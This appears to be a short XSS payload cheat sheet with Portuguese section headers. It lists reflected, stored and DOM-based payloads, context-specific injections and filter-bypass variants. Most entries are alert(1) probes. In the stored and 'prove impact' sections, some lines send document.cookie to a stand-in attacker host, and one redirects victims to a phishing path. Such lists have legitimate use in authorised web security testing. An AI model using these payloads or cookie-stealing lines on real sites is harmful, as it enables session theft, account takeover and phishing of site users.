# ───── XSS REFLETIDO (vai na URL) ─────
<script>alert(1)</script>
<img src=x onerror=alert(1)>
?q=%3Cscript%3Ealert(1)%3C/script%3E
?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E

Aninhado
<scr<script>ipt>alert(1)</script>

# ───── XSS ARMAZENADO (fica guardado) ─────
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<script>new Image().src='//attacker.mz/c?='+document.cookie</script>


# ───── XSS DOM (via #, não passa no servidor) ─────
#<img src=x onerror=alert(1)>
#<svg onload=alert(1)>
#;alert(1)


# ───── POR CONTEXTO ─────
# corpo HTML
<script>alert(1)</script>
<svg onload=alert(1)>

# dentro de atributo value="..."
"><script>alert(1)</script>
" autofocus onfocus=alert(1) x="

# dentro de <script> var a='...'
';alert(1)//
'-alert(1)-'

# dentro de href
javascript:alert(1)


# ───── BYPASS DE FILTRO ─────
<ScRiPt>alert(1)</ScRiPt>
<img src=x onerror=alert`1`>
<scr<script>ipt>alert(1)</scr</script>ipt>
<svg/onload=alert(1)>
<img src=x onerror="window['al'+'ert'](1)">


# ───── PROVAR IMPACTO ─────
<script>fetch('//attacker.mz/s?c='+document.cookie)</script>
<script>location='//attacker.mz/phish'</script>
